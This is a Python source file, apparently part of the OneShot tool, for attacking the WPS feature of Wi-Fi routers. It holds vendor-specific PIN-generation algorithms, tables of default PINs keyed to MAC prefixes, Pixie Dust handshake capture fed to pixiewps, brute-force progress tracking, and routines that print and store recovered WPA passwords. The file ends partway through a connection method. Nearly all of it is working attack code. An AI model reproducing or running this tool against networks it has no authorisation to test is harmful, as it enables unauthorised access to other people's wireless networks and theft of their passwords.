#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from __future__ import annotations

import argparse
import codecs
import collections
import csv
import os
import re
import shutil
import socket
import statistics
import subprocess
import sys
import tempfile
import time
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Callable

import wcwidth

SCRIPT_DIR = Path(__file__).resolve().parent
MAC_HEX_RE = re.compile(r"^[0-9A-Fa-f]{12}$")


class NetworkAddress:
    """Represents a 48-bit MAC/BSSID address with string and integer views."""

    def __init__(self, mac: str | int) -> None:
        if isinstance(mac, int):
            if not (0 <= mac <= 0xFFFFFFFFFFFF):
                raise ValueError("MAC integer must be between 0 and 0xFFFFFFFFFFFF")
            self._int_repr = mac
            self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            self._str_repr = mac.replace("-", ":").replace(".", ":").upper()
            self._int_repr = self._mac2int(self._str_repr)
        else:
            raise ValueError("MAC address must be string or integer")

    @property
    def string(self) -> str:
        return self._str_repr

    @string.setter
    def string(self, value: str) -> None:
        normalized = value.replace("-", ":").replace(".", ":").upper()
        self._int_repr = self._mac2int(normalized)
        self._str_repr = normalized

    @property
    def integer(self) -> int:
        return self._int_repr

    @integer.setter
    def integer(self, value: int) -> None:
        if not (0 <= value <= 0xFFFFFFFFFFFF):
            raise ValueError("MAC integer must be between 0 and 0xFFFFFFFFFFFF")
        self._int_repr = value
        self._str_repr = self._int2mac(value)

    def __int__(self) -> int:
        return self.integer

    def __str__(self) -> str:
        return self.string

    def __iadd__(self, other: int) -> NetworkAddress:
        self.integer = (self.integer + other) & 0xFFFFFFFFFFFF
        return self

    def __isub__(self, other: int) -> NetworkAddress:
        self.integer = (self.integer - other) & 0xFFFFFFFFFFFF
        return self

    def __eq__(self, other: object) -> bool:
        if isinstance(other, NetworkAddress):
            return self.integer == other.integer
        return NotImplemented

    def __ne__(self, other: object) -> bool:
        eq = self.__eq__(other)
        return eq if eq is NotImplemented else not eq

    def __lt__(self, other: object) -> bool:
        if isinstance(other, NetworkAddress):
            return self.integer < other.integer
        return NotImplemented

    def __gt__(self, other: object) -> bool:
        if isinstance(other, NetworkAddress):
            return self.integer > other.integer
        return NotImplemented

    @staticmethod
    def _mac2int(mac: str) -> int:
        cleaned = mac.replace(":", "")
        if not MAC_HEX_RE.fullmatch(cleaned):
            raise ValueError(f"Invalid MAC address: {mac}")
        return int(cleaned, 16)

    @staticmethod
    def _int2mac(mac: int) -> str:
        hex_str = f"{mac:012X}"
        return ":".join(hex_str[i : i + 2] for i in range(0, 12, 2))

    def __repr__(self) -> str:
        return f"NetworkAddress(string={self._str_repr!r}, integer={self._int_repr})"


class WPSpin:
    """WPS PIN generator."""

    ALGO_MAC = 0
    ALGO_EMPTY = 1
    ALGO_STATIC = 2

    def __init__(self) -> None:
        self.algos: dict[str, dict[str, object]] = {
            "pin24": {"name": "24-bit PIN", "mode": self.ALGO_MAC, "gen": self.pin24},
            "pin28": {"name": "28-bit PIN", "mode": self.ALGO_MAC, "gen": self.pin28},
            "pin32": {"name": "32-bit PIN", "mode": self.ALGO_MAC, "gen": self.pin32},
            "pinDLink": {"name": "D-Link PIN", "mode": self.ALGO_MAC, "gen": self.pinDLink},
            "pinDLink1": {"name": "D-Link PIN +1", "mode": self.ALGO_MAC, "gen": self.pinDLink1},
            "pinASUS": {"name": "ASUS PIN", "mode": self.ALGO_MAC, "gen": self.pinASUS},
            "pinAirocon": {"name": "Airocon Realtek", "mode": self.ALGO_MAC, "gen": self.pinAirocon},
            # Static pin algos
            "pinEmpty": {"name": "Empty PIN", "mode": self.ALGO_EMPTY, "gen": lambda mac: ""},
            "pinCisco": {"name": "Cisco", "mode": self.ALGO_STATIC, "gen": lambda mac: 1234567},
            "pinBrcm1": {"name": "Broadcom 1", "mode": self.ALGO_STATIC, "gen": lambda mac: 2017252},
            "pinBrcm2": {"name": "Broadcom 2", "mode": self.ALGO_STATIC, "gen": lambda mac: 4626484},
            "pinBrcm3": {"name": "Broadcom 3", "mode": self.ALGO_STATIC, "gen": lambda mac: 7622990},
            "pinBrcm4": {"name": "Broadcom 4", "mode": self.ALGO_STATIC, "gen": lambda mac: 6232714},
            "pinBrcm5": {"name": "Broadcom 5", "mode": self.ALGO_STATIC, "gen": lambda mac: 1086411},
            "pinBrcm6": {"name": "Broadcom 6", "mode": self.ALGO_STATIC, "gen": lambda mac: 3195719},
            "pinAirc1": {"name": "Airocon 1", "mode": self.ALGO_STATIC, "gen": lambda mac: 3043203},
            "pinAirc2": {"name": "Airocon 2", "mode": self.ALGO_STATIC, "gen": lambda mac: 7141225},
            "pinDSL2740R": {"name": "DSL-2740R", "mode": self.ALGO_STATIC, "gen": lambda mac: 6817554},
            "pinRealtek1": {"name": "Realtek 1", "mode": self.ALGO_STATIC, "gen": lambda mac: 9566146},
            "pinRealtek2": {"name": "Realtek 2", "mode": self.ALGO_STATIC, "gen": lambda mac: 9571911},
            "pinRealtek3": {"name": "Realtek 3", "mode": self.ALGO_STATIC, "gen": lambda mac: 4856371},
            "pinUpvel": {"name": "Upvel", "mode": self.ALGO_STATIC, "gen": lambda mac: 2085483},
            "pinUR814AC": {"name": "UR-814AC", "mode": self.ALGO_STATIC, "gen": lambda mac: 4397768},
            "pinUR825AC": {"name": "UR-825AC", "mode": self.ALGO_STATIC, "gen": lambda mac: 529417},
            "pinOnlime": {"name": "Onlime", "mode": self.ALGO_STATIC, "gen": lambda mac: 9995604},
            "pinEdimax": {"name": "Edimax", "mode": self.ALGO_STATIC, "gen": lambda mac: 3561153},
            "pinThomson": {"name": "Thomson", "mode": self.ALGO_STATIC, "gen": lambda mac: 6795814},
            "pinHG532x": {"name": "HG532x", "mode": self.ALGO_STATIC, "gen": lambda mac: 3425928},
            "pinH108L": {"name": "H108L", "mode": self.ALGO_STATIC, "gen": lambda mac: 9422988},
            "pinONO": {"name": "CBN ONO", "mode": self.ALGO_STATIC, "gen": lambda mac: 9575521},
        }

    @staticmethod
    def checksum(pin: int) -> int:
        accum = 0
        while pin:
            accum += 3 * (pin % 10)
            pin //= 10
            accum += pin % 10
            pin //= 10
        return (10 - accum % 10) % 10

    def generate(self, algo: str, mac: str | NetworkAddress) -> str:
        addr = mac if isinstance(mac, NetworkAddress) else NetworkAddress(mac)
        if algo not in self.algos:
            raise ValueError("Invalid WPS pin algorithm")
        gen_fn: Callable[[NetworkAddress], int | str] = self.algos[algo]["gen"]  # type: ignore[assignment]
        raw_pin = gen_fn(addr)
        if algo == "pinEmpty":
            return str(raw_pin)
        pin_num = int(raw_pin) % 10_000_000
        return f"{pin_num}{self.checksum(pin_num)}".zfill(8)

    def _format_entries(self, algo_ids: list[str], mac: str | NetworkAddress, get_static: bool = True) -> list[dict[str, str]]:
        res: list[dict[str, str]] = []
        for algo_id in algo_ids:
            algo = self.algos[algo_id]
            mode = algo["mode"]
            if mode == self.ALGO_STATIC and not get_static:
                continue
            name = str(algo["name"])
            if mode == self.ALGO_STATIC:
                name = f"Static PIN — {name}"
            res.append({"id": algo_id, "name": name, "pin": self.generate(algo_id, mac)})
        return res

    def getAll(self, mac: str | NetworkAddress, get_static: bool = True) -> list[dict[str, str]]:
        return self._format_entries(list(self.algos.keys()), mac, get_static=get_static)

    def getList(self, mac: str | NetworkAddress, get_static: bool = True) -> list[str]:
        return [item["pin"] for item in self.getAll(mac, get_static=get_static)]

    def getSuggested(self, mac: str | NetworkAddress) -> list[dict[str, str]]:
        mac_str = mac.string if isinstance(mac, NetworkAddress) else str(mac)
        return self._format_entries(self._suggest(mac_str), mac_str, get_static=True)

    def getSuggestedList(self, mac: str | NetworkAddress) -> list[str]:
        return [item["pin"] for item in self.getSuggested(mac)]

    def getLikely(self, mac: str | NetworkAddress) -> str | None:
        suggested = self.getSuggestedList(mac)
        return suggested[0] if suggested else None

    def _suggest(self, mac: str) -> list[str]:
        clean_mac = mac.replace(":", "").upper()
        algorithms: dict[str, tuple[str, ...]] = {
            "pin24": (
                "04BF6D", "0E5D4E", "107BEF", "14A9E3", "28285D", "2A285D", "32B2DC", "381766",
                "404A03", "4E5D4E", "5067F0", "5CF4AB", "6A285D", "8E5D4E", "AA285D", "B0B2DC",
                "C86C87", "CC5D4E", "CE5D4E", "EA285D", "E243F6", "EC43F6", "EE43F6", "F2B2DC",
                "FCF528", "FEF528", "4C9EFF", "0014D1", "D8EB97", "1C7EE5", "84C9B2", "FC7516",
                "14D64D", "9094E4", "BCF685", "C4A81D", "00664B", "087A4C", "14B968", "2008ED",
                "346BD3", "4CEDDE", "786A89", "88E3AB", "D46E5C", "E8CD2D", "EC233D", "ECCB30",
                "F49FF3", "20CF30", "90E6BA", "E0CB4E", "D4BF7F4", "F8C091", "001CDF", "002275",
                "08863B", "00B00C", "081075", "C83A35", "0022F7", "001F1F", "00265B", "68B6CF",
                "788DF7", "BC1401", "202BC1", "308730", "5C4CA9", "62233D", "623CE4", "623DFF",
                "6253D4", "62559C", "626BD3", "627D5E", "6296BF", "62A8E4", "62B686", "62C06F",
                "62C61F", "62C714", "62CBA8", "62CDBE", "62E87B", "6416F0", "6A1D67", "6A233D",
                "6A3DFF", "6A53D4", "6A559C", "6A6BD3", "6A96BF", "6A7D5E", "6AA8E4", "6AC06F",
                "6AC61F", "6AC714", "6ACBA8", "6ACDBE", "6AD15E", "6AD167", "721D67", "72233D",
                "723CE4", "723DFF", "7253D4", "72559C", "726BD3", "727D5E", "7296BF", "72A8E4",
                "72C06F", "72C61F", "72C714", "72CBA8", "72CDBE", "72D15E", "72E87B", "0026CE",
                "9897D1", "E04136", "B246FC", "E24136", "00E020", "5CA39D", "D86CE9", "DC7144",
                "801F02", "E47CF9", "000CF6", "00A026", "A0F3C1", "647002", "B0487A", "F81A67",
                "F8D111", "34BA9A", "B4944E",
            ),
            "pin28": ("200BC7", "4846FB", "D46AA8", "F84ABF"),
            "pin32": (
                "000726", "D8FEE3", "FC8B97", "1062EB", "1C5F2B", "48EE0C", "802689", "908D78",
                "E8CC18", "2CAB25", "10BF48", "14DAE9", "3085A9", "50465D", "5404A6", "C86000",
                "F46D04", "3085A9", "801F02",
            ),
            "pinDLink": (
                "14D64D", "1C7EE5", "28107B", "84C9B2", "A0AB1B", "B8A386", "C0A0BB", "CCB255",
                "FC7516", "0014D1", "D8EB97",
            ),
            "pinDLink1": (
                "0018E7", "00195B", "001CF0", "001E58", "002191", "0022B0", "002401", "00265A",
                "14D64D", "1C7EE5", "340804", "5CD998", "84C9B2", "B8A386", "C8BE19", "C8D3A3",
                "CCB255", "0014D1",
            ),
            "pinASUS": (
                "049226", "04D9F5", "08606E", "0862669", "107B44", "10BF48", "10C37B", "14DDA9",
                "1C872C", "1CB72C", "2C56DC", "2CFDA1", "305A3A", "382C4A", "38D547", "40167E",
                "50465D", "54A050", "6045CB", "60A44C", "704D7B", "74D02B", "7824AF", "88D7F6",
                "9C5C8E", "AC220B", "AC9E17", "B06EBF", "BCEE7B", "C860007", "D017C2", "D850E6",
                "E03F49", "F0795978", "F832E4", "00072624", "0008A1D3", "00177C", "001EA6",
                "00304FB", "00E04C0", "048D38", "081077", "081078", "081079", "083E5D", "10FEED3C",
                "181E78", "1C4419", "2420C7", "247F20", "2CAB25", "3085A98C", "3C1E04", "40F201",
                "44E9DD", "48EE0C", "5464D9", "54B80A", "587BE906", "60D1AA21", "64517E", "64D954",
                "6C198F", "6C7220", "6CFDB9", "78D99FD", "7C2664", "803F5DF6", "84A423", "88A6C6",
                "8C10D4", "8C882B00", "904D4A", "907282", "90F65290", "94FBB2", "A01B29", "A0F3C1E",
                "A8F7E00", "ACA213", "B85510", "B8EE0E", "BC3400", "BC9680", "C891F9", "D00ED90",
                "D084B0", "D8FEE3", "E4BEED", "E894F6F6", "EC1A5971", "EC4C4D", "F42853", "F43E61",
                "F46BEF", "F8AB05", "FC8B97", "7062B8", "78542E", "C0A0BB8C", "C412F5", "C4A81D",
                "E8CC18", "EC2280", "F8E903F4",
            ),
            "pinAirocon": (
                "0007262F", "000B2B4A", "000EF4E7", "001333B", "00177C", "001AEF", "00E04BB3",
                "02101801", "0810734", "08107710", "1013EE0", "2CAB25C7", "788C54", "803F5DF6",
                "94FBB2", "BC9680", "F43E61", "FC8B97",
            ),
            "pinEmpty": (
                "E46F13", "EC2280", "58D56E", "1062EB", "10BEF5", "1C5F2B", "802689", "A0AB1B",
                "74DADA", "9CD643", "68A0F6", "0C96BF", "20F3A3", "ACE215", "C8D15E", "000E8F",
                "D42122", "3C9872", "788102", "7894B4", "D460E3", "E06066", "004A77", "2C957F",
                "64136C", "74A78E", "88D274", "702E22", "74B57E", "789682", "7C3953", "8C68C8",
                "D476EA", "344DEA", "38D82F", "54BE53", "709F2D", "94A7B7", "981333", "CAA366",
                "D0608C",
            ),
            "pinCisco": ("001A2B", "00248C", "002618", "344DEB", "7071BC", "E06995", "E0CB4E", "7054F5"),
            "pinBrcm1": ("ACF1DF", "BCF685", "C8D3A3", "988B5D", "001AA9", "14144B", "EC6264"),
            "pinBrcm2": ("14D64D", "1C7EE5", "28107B", "84C9B2", "B8A386", "BCF685", "C8BE19"),
            "pinBrcm3": ("14D64D", "1C7EE5", "28107B", "B8A386", "BCF685", "C8BE19", "7C034C"),
            "pinBrcm4": (
                "14D64D", "1C7EE5", "28107B", "84C9B2", "B8A386", "BCF685", "C8BE19", "C8D3A3",
                "CCB255", "FC7516", "204E7F", "4C17EB", "18622C", "7C03D8", "D86CE9",
            ),
            "pinBrcm5": (
                "14D64D", "1C7EE5", "28107B", "84C9B2", "B8A386", "BCF685", "C8BE19", "C8D3A3",
                "CCB255", "FC7516", "204E7F", "4C17EB", "18622C", "7C03D8", "D86CE9",
            ),
            "pinBrcm6": (
                "14D64D", "1C7EE5", "28107B", "84C9B2", "B8A386", "BCF685", "C8BE19", "C8D3A3",
                "CCB255", "FC7516", "204E7F", "4C17EB", "18622C", "7C03D8", "D86CE9",
            ),
            "pinAirc1": ("181E78", "40F201", "44E9DD", "D084B0"),
            "pinAirc2": ("84A423", "8C10D4", "88A6C6"),
            "pinDSL2740R": ("00265A", "1CBDB9", "340804", "5CD998", "84C9B2", "FC7516"),
            "pinRealtek1": ("0014D1", "000C42", "000EE8"),
            "pinRealtek2": ("007263", "E4BEED"),
            "pinRealtek3": ("08C6B3",),
            "pinUpvel": ("784476", "D4BF7F0", "F8C091"),
            "pinUR814AC": ("D4BF7F60",),
            "pinUR825AC": ("D4BF7F5",),
            "pinOnlime": ("D4BF7F", "F8C091", "144D67", "784476", "0014D1"),
            "pinEdimax": ("801F02", "00E04C"),
            "pinThomson": ("002624", "4432C8", "88F7C7", "CC03FA"),
            "pinHG532x": (
                "00664B", "086361", "087A4C", "0C96BF", "14B968", "2008ED", "2469A5", "346BD3",
                "786A89", "88E3AB", "9CC172", "ACE215", "D07AB5", "CCA223", "E8CD2D", "F80113",
                "F83DFF",
            ),
            "pinH108L": ("4C09B4", "4CAC0A", "84742A4", "9CD24B", "B075D5", "C864C7", "DC028E", "FCC897"),
            "pinONO": ("5C353B", "DC537C"),
        }
        return [algo_id for algo_id, masks in algorithms.items() if clean_mac.startswith(masks)]

    def pin24(self, mac: NetworkAddress) -> int:
        return mac.integer & 0xFFFFFF

    def pin28(self, mac: NetworkAddress) -> int:
        return mac.integer & 0xFFFFFFF

    def pin32(self, mac: NetworkAddress) -> int:
        return mac.integer % 0x100000000

    def pinDLink(self, mac: NetworkAddress) -> int:
        nic = mac.integer & 0xFFFFFF
        pin = nic ^ 0x55AA55
        pin ^= (
            ((pin & 0xF) << 4)
            + ((pin & 0xF) << 8)
            + ((pin & 0xF) << 12)
            + ((pin & 0xF) << 16)
            + ((pin & 0xF) << 20)
        )
        pin %= 10_000_000
        if pin < 1_000_000:
            pin += ((pin % 9) * 1_000_000) + 1_000_000
        return pin

    def pinDLink1(self, mac: NetworkAddress) -> int:
        shifted = NetworkAddress(mac.integer + 1)
        return self.pinDLink(shifted)

    def pinASUS(self, mac: NetworkAddress) -> int:
        b = [int(part, 16) for part in mac.string.split(":")]
        digits = [
            str((b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))
            for i in range(7)
        ]
        return int("".join(digits))

    def pinAirocon(self, mac: NetworkAddress) -> int:
        b = [int(part, 16) for part in mac.string.split(":")]
        return (
            ((b[0] + b[1]) % 10)
            + (((b[5] + b[0]) % 10) * 10)
            + (((b[4] + b[5]) % 10) * 100)
            + (((b[3] + b[4]) % 10) * 1000)
            + (((b[2] + b[3]) % 10) * 10000)
            + (((b[1] + b[2]) % 10) * 100000)
            + (((b[0] + b[1]) % 10) * 1000000)
        )


def get_hex(line: str) -> str:
    parts = line.split(":", 3)
    return parts[2].replace(" ", "").upper()


def _decode_escaped_ssid(raw: str) -> str:
    try:
        return codecs.decode(raw, "unicode-escape").encode("latin1").decode("utf-8", errors="replace")
    except Exception:
        return raw


@dataclass
class PixiewpsData:
    pke: str = ""
    pkr: str = ""
    e_hash1: str = ""
    e_hash2: str = ""
    authkey: str = ""
    e_nonce: str = ""

    def clear(self) -> None:
        self.pke = ""
        self.pkr = ""
        self.e_hash1 = ""
        self.e_hash2 = ""
        self.authkey = ""
        self.e_nonce = ""

    def got_all(self) -> bool:
        return bool(
            self.pke and self.pkr and self.e_nonce and self.authkey and self.e_hash1 and self.e_hash2
        )

    def get_pixie_argv(self, full_range: bool = False) -> list[str]:
        cmd = [
            "pixiewps",
            "--pke", self.pke,
            "--pkr", self.pkr,
            "--e-hash1", self.e_hash1,
            "--e-hash2", self.e_hash2,
            "--authkey", self.authkey,
            "--e-nonce", self.e_nonce,
        ]
        if full_range:
            cmd.append("--force")
        return cmd

    def get_pixie_cmd(self, full_range: bool = False) -> str:
        return " ".join(self.get_pixie_argv(full_range=full_range))


@dataclass
class ConnectionStatus:
    status: str = ""  # WSC_NACK, WPS_FAIL or GOT_PSK
    last_m_message: int = 0
    essid: str = ""
    wpa_psk: str = ""
    bssid: str = ""

    def isFirstHalfValid(self) -> bool:
        return self.last_m_message > 5

    def clear(self) -> None:
        self.status = ""
        self.last_m_message = 0
        self.essid = ""
        self.wpa_psk = ""
        self.bssid = ""


@dataclass
class BruteforceStatus:
    start_time: str = field(default_factory=lambda: datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    mask: str = ""
    last_attempt_time: float = field(default_factory=time.monotonic)
    attempts_times: collections.deque[float] = field(default_factory=lambda: collections.deque(maxlen=15))
    counter: int = 0
    statistics_period: int = 5

    def display_status(self) -> None:
        average_pin_time = statistics.mean(self.attempts_times) if self.attempts_times else 0.0
        if len(self.mask) == 4:
            percentage = int(self.mask) / 11000 * 100
        else:
            percentage = ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
        print(f"[*] {percentage:.2f}% complete @ {self.start_time} ({average_pin_time:.2f} seconds/pin)")

    def registerAttempt(self, mask: str) -> None:
        self.mask = mask
        self.counter += 1
        now = time.monotonic()
        self.attempts_times.append(now - self.last_attempt_time)
        self.last_attempt_time = now
        if self.counter == self.statistics_period:
            self.counter = 0
            self.display_status()

    def clear(self) -> None:
        self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.mask = ""
        self.last_attempt_time = time.monotonic()
        self.attempts_times.clear()
        self.counter = 0


class Companion:
    """Main WPS connection and attack orchestrator."""

    def __init__(self, interface: str, save_result: bool = False, print_debug: bool = False, bssid: str = "") -> None:
        self.interface = interface
        self.save_result = save_result
        self.print_debug = print_debug
        self._cleaned = False

        self._tmp_dir_obj = tempfile.TemporaryDirectory()
        self.tempdir = self._tmp_dir_obj.name
        conf_path = Path(self.tempdir) / "wpa_supplicant.conf"
        conf_path.write_text(
            f"ctrl_interface={self.tempdir}\nctrl_interface_group=root\nupdate_config=1\n",
            encoding="utf-8",
        )
        self.tempconf = str(conf_path)
        self.wpas_ctrl_path = str(Path(self.tempdir) / interface)

        self.res_socket_file = str(Path(tempfile.gettempdir()) / f"oneshot_{os.getpid()}_{next(tempfile._get_candidate_names())}")
        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.retsock.bind(self.res_socket_file)

        self.pixie_creds = PixiewpsData()
        self.connection_status = ConnectionStatus()
        self.bruteforce = BruteforceStatus()

        user_home = Path.home()
        self.sessions_dir = user_home / ".OneShot" / "sessions"
        self.pixiewps_dir = user_home / ".OneShot" / "pixiewps"
        self.reports_dir = SCRIPT_DIR / "reports"
        self.sessions_dir.mkdir(parents=True, exist_ok=True)
        self.pixiewps_dir.mkdir(parents=True, exist_ok=True)

        self.generator = WPSpin()
        self.bssid = bssid
        self.lastPwr = 0

        self.__init_wpa_supplicant()

    def __init_wpa_supplicant(self) -> None:
        print("[*] Running wpa_supplicant…")
        cmd = [
            "wpa_supplicant",
            "-K",
            "-d",
            "-Dnl80211,wext,hostapd,wired",
            "-i",
            self.interface,
            "-c",
            self.tempconf,
        ]
        self.wpas = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            encoding="utf-8",
            errors="replace",
        )
        ctrl_path = Path(self.wpas_ctrl_path)
        while True:
            ret = self.wpas.poll()
            if ret is not None and ret != 0:
                out, _ = self.wpas.communicate(timeout=2)
                raise ValueError(f"wpa_supplicant returned an error: {out}")
            if ctrl_path.exists():
                break
            time.sleep(0.1)

    def sendOnly(self, command: str) -> None:
        self.retsock.sendto(command.encode("utf-8"), self.wpas_ctrl_path)

    def sendAndReceive(self, command: str) -> str:
        self.retsock.sendto(command.encode("utf-8"), self.wpas_ctrl_path)
        data, _ = self.retsock.recvfrom(4096)
        return data.decode("utf-8", errors="replace")

    @staticmethod
    def _explain_wpas_not_ok_status(command: str, respond: str) -> str:
        if command.startswith(("WPS_REG", "WPS_PBC")) and respond == "UNKNOWN COMMAND":
            return (
                "[!] It looks like your wpa_supplicant is compiled without WPS protocol support. "
                'Please build wpa_supplicant with WPS support ("CONFIG_WPS=y")'
            )
        return "[!] Something went wrong — check out debug log"

    def __handle_wpas(
        self,
        pixiemode: bool = False,
        pbc_mode: bool = False,
        verbose: bool | None = None,
        bssid: str = "",
    ) -> bool:
        if verbose is None:
            verbose = self.print_debug
        if self.wpas.stdout is None:
            return False
        line = self.wpas.stdout.readline()
        if not line:
            self.wpas.wait()
            return False
        line = line.rstrip("\n")

        if verbose:
            sys.stderr.write(line + "\n")

        if line.startswith("WPS: "):
            if "Building Message M" in line:
                n = int(line.split("Building Message M")[1].replace("D", ""))
                self.connection_status.last_m_message = n
                self.__print_with_indicators("*", f"Sending WPS Message M{n}…")
            elif "Received M" in line:
                n = int(line.split("Received M")[1])
                self.connection_status.last_m_message = n
                self.__print_with_indicators("*", f"Received WPS Message M{n}")
                if n == 5:
                    print("[+] The first half of the PIN is valid")
            elif "Received WSC_NACK" in line:
                self.connection_status.status = "WSC_NACK"
                self.__print_with_indicators("*", "Received WSC NACK")
                print("[-] Error: wrong PIN code")
            elif "Enrollee Nonce" in line and "hexdump" in line:
                self.pixie_creds.e_nonce = get_hex(line)
                assert len(self.pixie_creds.e_nonce) == 16 * 2
                if pixiemode:
                    print(f"[P] E-Nonce: {self.pixie_creds.e_nonce}")
            elif "DH own Public Key" in line and "hexdump" in line:
                self.pixie_creds.pkr = get_hex(line)
                assert len(self.pixie_creds.pkr) == 192 * 2
                if pixiemode:
                    print(f"[P] PKR: {self.pixie_creds.pkr}")
            elif "DH peer Public Key" in line and "hexdump" in line:
                self.pixie_creds.pke = get_hex(line)
                assert len(self.pixie_creds.pke) == 192 * 2
                if pixiemode:
                    print(f"[P] PKE: {self.pixie_creds.pke}")
            elif "AuthKey" in line and "hexdump" in line:
                self.pixie_creds.authkey = get_hex(line)
                assert len(self.pixie_creds.authkey) == 32 * 2
                if pixiemode:
                    print(f"[P] AuthKey: {self.pixie_creds.authkey}")
            elif "E-Hash1" in line and "hexdump" in line:
                self.pixie_creds.e_hash1 = get_hex(line)
                assert len(self.pixie_creds.e_hash1) == 32 * 2
                if pixiemode:
                    print(f"[P] E-Hash1: {self.pixie_creds.e_hash1}")
            elif "E-Hash2" in line and "hexdump" in line:
                self.pixie_creds.e_hash2 = get_hex(line)
                assert len(self.pixie_creds.e_hash2) == 32 * 2
                if pixiemode:
                    print(f"[P] E-Hash2: {self.pixie_creds.e_hash2}")
            elif "Network Key" in line and "hexdump" in line:
                self.connection_status.status = "GOT_PSK"
                self.connection_status.wpa_psk = bytes.fromhex(get_hex(line)).decode("utf-8", errors="replace")
        elif ": State: " in line and "-> SCANNING" in line:
            self.connection_status.status = "scanning"
            self.__print_with_indicators("*", "Scanning…")
        elif ("WPS-FAIL" in line) and (self.connection_status.status != ""):
            self.connection_status.status = "WPS_FAIL"
            print("[-] wpa_supplicant returned WPS-FAIL")
        elif "Trying to authenticate with" in line:
            self.connection_status.status = "authenticating"
            if "SSID" in line:
                self.connection_status.essid = _decode_escaped_ssid("'".join(line.split("'")[1:-1]))
            self.__print_with_indicators("*", "Authenticating…")
        elif "Authentication response" in line:
            self.__print_with_indicators("*", "Authenticated")
        elif "Trying to associate with" in line:
            self.connection_status.status = "associating"
            if "SSID" in line:
                self.connection_status.essid = _decode_escaped_ssid("'".join(line.split("'")[1:-1]))
            self.__print_with_indicators("*", "Associating with AP…")
        elif ("Associated with" in line) and (self.interface in line):
            ap_bssid = line.split()[-1].upper()
            if self.connection_status.essid:
                self.__print_with_indicators("+", f"Associated with {ap_bssid} (ESSID: {self.connection_status.essid})")
            else:
                self.__print_with_indicators("+", f"Associated with {ap_bssid}")
        elif "EAPOL: txStart" in line:
            self.connection_status.status = "eapol_start"
            self.__print_with_indicators("*", "Sending EAPOL Start…")
        elif "EAP entering state IDENTITY" in line:
            self.__print_with_indicators("*", "Received Identity Request")
        elif "using real identity" in line:
            self.__print_with_indicators("*", "Sending Identity Response…")
        elif self.bssid and self.bssid in line and "level=" in line:
            self.lastPwr = line.split("level=")[1].split(" ")[0]
        elif pbc_mode and ("selected BSS " in line):
            ap_bssid = line.split("selected BSS ")[-1].split()[0].upper()
            self.connection_status.bssid = ap_bssid
            print(f"[*] Selected AP: {ap_bssid}")
        elif bssid and bssid in line and "level=" in line:
            sig = line.split("level=")[1].split(" ")[0]
            if "noise=" in line:
                noise = line.split("noise=")[1].split(" ")[0]
                print(f"[i] Current signal: {sig}, noise: {noise}")
            else:
                print(f"[i] Current signal: {sig}")

        return True

    def __runPixiewps(self, showcmd: bool = False, full_range: bool = False) -> str | bool:
        self.__print_with_indicators("*", "Running Pixiewps…")
        argv = self.pixie_creds.get_pixie_argv(full_range=full_range)
        if showcmd:
            print(" ".join(argv))
        res = subprocess.run(
            argv,
            stdout=subprocess.PIPE,
            stderr=sys.stdout,
            encoding="utf-8",
            errors="replace",
            check=False,
        )
        print(res.stdout)
        if res.returncode == 0:
            for line in res.stdout.splitlines():
                if ("[+]" in line) and ("WPS pin" in line):
                    pin = line.split(":")[-1].strip()
                    return "''" if pin == "<empty>" else pin
        return False

    def __credentialPrint(self, wps_pin: str | None = None, wpa_psk: str | None = None, essid: str | None = None) -> None:
        print(f"[+] WPS PIN: '{wps_pin}'")
        print(f"[+] WPA PSK: '{wpa_psk}'")
        print(f"[+] AP SSID: '{essid}'")

    def __saveResult(self, bssid: str, essid: str, wps_pin: str, wpa_psk: str) -> None:
        self.reports_dir.mkdir(parents=True, exist_ok=True)
        base = self.reports_dir / "stored"
        txt_path = base.with_suffix(".txt")
        csv_path = base.with_suffix(".csv")
        date_str = datetime.now().strftime("%d.%m.%Y %H:%M")

        with txt_path.open("a", encoding="utf-8") as f_txt:
            f_txt.write(f"{date_str}\nBSSID: {bssid}\nESSID: {essid}\nWPS PIN: {wps_pin}\nWPA PSK: {wpa_psk}\n\n")

        write_header = not csv_path.is_file()
        with csv_path.open("a", newline="", encoding="utf-8") as f_csv:
            writer = csv.writer(f_csv, delimiter=";", quoting=csv.QUOTE_ALL)
            if write_header:
                writer.writerow(["Date", "BSSID", "ESSID", "WPS PIN", "WPA PSK"])
            writer.writerow([date_str, bssid, essid, wps_pin, wpa_psk])

        print(f"[i] Credentials saved to {txt_path}, {csv_path}")

    def __savePin(self, bssid: str, pin: str) -> None:
        pin_file = self.pixiewps_dir / f"{bssid.replace(':', '').upper()}.run"
        pin_file.write_text(pin, encoding="utf-8")
        print(f"[i] PIN saved in {pin_file}")

    def __prompt_wpspin(self, bssid: str) -> str | None:
        pins = self.generator.getSuggested(bssid)
        if len(pins) > 1:
            print(f"PINs generated for {bssid}:")
            print(f"{'#':<3} {'PIN':<10} {'Name'}")
            for idx, item in enumerate(pins, 1):
                print(f"{f'{idx})':<3} {item['pin']:<10} {item['name']}")
            while True:
                pin_no = input("Select the PIN: ").strip()
                try:
                    choice = int(pin_no)
                    if 1 <= choice <= len(pins):
                        return pins[choice - 1]["pin"]
                    raise IndexError
                except Exception:
                    print("Invalid number")
        if len(pins) == 1:
            print("[i] The only probable PIN is selected:", pins[0]["name"])
            return pins[0]["pin"]
        return None

    def __wps_connection(
        self,
        bssid: str | None = None,
        pin: str | None = None,
        pixiemode: bool = False,
        pbc_mode: bool = False,
        verbose: bool | None = None,
    ) -> bool:
        if verbose is None:
            verbose = self.print_debug
        self.pixie_creds.clear()
        self.connection_status.clear()
        if self.wpas.stdout is not None:
            try:
                os.set_blocking(self.wpas.stdout.fileno(), False)
                self.wpas.stdout.read(300)
            except Exception:
                pass
            finally:
                try:
                    os.set_blocking(self.wpas.stdout.fileno(), True)
                except Exception:
                    pass

        if pbc_mode:
            if bssid:
                print(f"[*] Starting WPS push button connection to {bssid}…")
                cmd = f"WPS_PBC {bssid}"
            else:
                print("[*] Starting WPS push button connection…")
                cmd = "WPS_PBC"
        else:
            print(f"[*] Trying PIN '{pin}'…")
